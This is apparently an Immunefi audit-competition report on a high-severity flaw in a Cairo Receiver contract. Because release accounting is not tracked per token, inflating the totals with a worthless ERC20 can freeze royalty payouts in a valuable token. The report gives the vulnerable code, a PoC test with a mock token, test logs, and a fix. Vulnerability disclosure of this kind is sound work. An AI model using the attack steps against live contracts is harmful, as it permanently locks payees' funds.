# 57676 sc high cross token accounting in receiver allows permanent freezing of erc20 royalty payouts

* **Submitted on:** Oct 28th 2025 at 04:36:11 UTC by @Rhaydden for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* **Report ID:** #57676
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/receiver/receiver.cairo>
* **Impacts:** Permanent freezing of unclaimed royalties

## Description

### Issue description

The `Receiver` contract mixes accounting across different ERC20 tokens when calculating pending payments, because `total_released` and `released` are global (not keyed by `payment_token`). As a result, inflating totals with a worthless ERC20 skews the computation for a valuable ERC20, causing oversized `to_release` amounts that exceed the Receiver’s balance in that valuable token and revert transfers.

Relevant excerpt from the code: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/receiver/receiver.cairo#L28-L31>

```cairo
// src/receiver/receiver.cairo

#[storage]
struct Storage {
    payees: Vec<ContractAddress>,
    shares: Map<ContractAddress, u16>,
    total_released: u256,                         // BUG: not keyed by payment_token
    released: Map<ContractAddress, u256>,         // BUG: not keyed by payment_token
}

fn _release(
    ref self: ContractState, payment_token: ContractAddress, to: ContractAddress,
) -> u256 {
    let token = IERC20Dispatcher { contract_address: payment_token };

    let total_released = self.total_released.read();       // uses global total
    let released = self.released.read(to);                 // uses global per-payee

    let to_release = self
        ._pending_payment(
            to, token.balance_of(get_contract_address()) + total_released, released,
        );

    if to_release == 0 { return 0; }

    self.released.write(to, released + to_release);
    self.total_released.write(total_released + to_release);

    token.transfer(to, to_release);                        // reverts if balance insufficient

    ...
}
```

Because `total_released` and `released` are not tracked per token, the arithmetic blends “units” from multiple ERC20s. An attacker can:

* Mint a huge amount of their own ERC20 `W` to the `Receiver`.
* Call `release(W, payee)` (anyone can call `release` as long as `to` is a valid payee).

This inflates global totals in `W` units. Later, releasing a valuable ERC20 `A` computes a very large `to_release` in `A` units, exceeding `A` balance and causing transfer to revert.

### Impact

High — Permanent freezing of unclaimed royalties.

Releases in the valuable token can be permanently blocked after inflating global totals with a worthless token. Unblocking would require funding the Receiver with an equivalently huge amount of the valuable token, which is impractical, so affected royalties become effectively permanently frozen. No direct theft is required. This is effectively a DoS on payouts.

{% hint style="info" %}
This vulnerability stems from using global release accounting for multiple distinct ERC20 tokens. Accounting must be scoped per payment token to avoid mixing units.
{% endhint %}

## Recommended mitigation steps

* Replace global accounting with per-token tracking:
  * `total_released_by_token: Map<ContractAddress, u256>`
  * `released_by_token: Map<(ContractAddress, ContractAddress), u256>` (keyed by `(payment_token, payee)`)
* Update getters and interface:
  * `totalReleased(payment_token: ContractAddress) -> u256`
  * `released(payment_token: ContractAddress, account: ContractAddress) -> u256`
* Compute pending payment with per-token totals only:
  * `to_release = f(token.balance_of(receiver) + total_released_by_token[token], released_by_token[(token, to)], shares[to])`

## Proof of Concept

The following PoC demonstrates how inflating global totals with a worthless token causes a release of a valuable token to compute an oversized `to_release` and fail due to insufficient balance.

<details>

<summary>PoC test (test_poc.cairo)</summary>

```cairo
tuse starknet::{ContractAddress, contract_address_const};
use snforge_std::{declare, ContractClassTrait, DeclareResultTrait};
use crate::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
use crate::receiver::interface::{IReceiverDispatcher, IReceiverDispatcherTrait};

#[test]
#[should_panic]
fn test_cross_token_dos_on_valuable_release() {
    // Declare contract classes
    let receiver_class = declare("Receiver").unwrap().contract_class();
    let erc20_class = declare("ERC20Mock").unwrap().contract_class();

    // Deploy contracts
    let (receiver, _) = receiver_class.deploy(@array![]).unwrap();
    let (token_a, _) = erc20_class.deploy(@array![]).unwrap();
    let (token_w, _) = erc20_class.deploy(@array![]).unwrap();

    // Mint a huge amount of worthless token W to the Receiver and release to a payee
    IERC20Dispatcher { contract_address: token_w }.mint(receiver, 1_000_000);

    let receiver_disp = IReceiverDispatcher { contract_address: receiver };
    let creator = contract_address_const::<1>();
    let platform = contract_address_const::<2>();

    // First release with token W to inflate global totals
    receiver_disp.release(token_w, platform);

    // Now mint a small amount of valuable token A to the Receiver
    IERC20Dispatcher { contract_address: token_a }.mint(receiver, 100);

    // Attempting to release A to the creator will compute a huge to_release amount
    // and the ERC20 transfer will fail with insufficient balance, causing panic
    receiver_disp.release(token_a, creator);
}
```

</details>

<details>

<summary>ERC20 mock used for PoC (erc20mock.cairo)</summary>

```cairo
// Minimal ERC20 mock sufficient for PoC
#[starknet::contract]
pub mod ERC20Mock {
    use starknet::{ContractAddress, get_caller_address};
    use starknet::storage::{Map, StorageMapReadAccess, StorageMapWriteAccess};
    use crate::erc20::interface::{IERC20, IERC20Dispatcher, IERC20DispatcherTrait};

    #[storage]
    struct Storage {
        balances: Map<ContractAddress, u256>,
    }

    #[abi(embed_v0)]
    impl IERC20Impl of IERC20<ContractState> {
        fn balance_of(self: @ContractState, account: ContractAddress) -> u256 {
            self.balances.read(account)
        }

        fn transfer(ref self: ContractState, to: ContractAddress, amount: u256) {
            let from = get_caller_address();
            let from_bal = self.balances.read(from);
            assert(from_bal >= amount, 'Insufficient balance');
            self.balances.write(from, from_bal - amount);
            let to_bal = self.balances.read(to);
            self.balances.write(to, to_bal + amount);
        }

        fn mint(ref self: ContractState, recipient: ContractAddress, amount: u256) {
            let bal = self.balances.read(recipient);
            self.balances.write(recipient, bal + amount);
        }
    }
}
```

</details>

## Running the PoC

Run the test with:

```
snforge test
```

### Logs from the test run

```
Collected 1 test(s) from receiver_poc package
Running 1 test(s) from src/
[PASS] receiver_poc::tests::test_poc::test_cross_token_dos_on_valuable_release (l1_gas: ~0, l1_data_gas: ~1344, l2_gas: ~2316250)
Tests: 1 passed, 0 failed, 0 ignored, 0 filtered out
```

The PASS indicates the expected panic (DoS condition) occurred during `release(A, creator)`.

## References

* Vulnerable source file: <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/receiver/receiver.cairo>
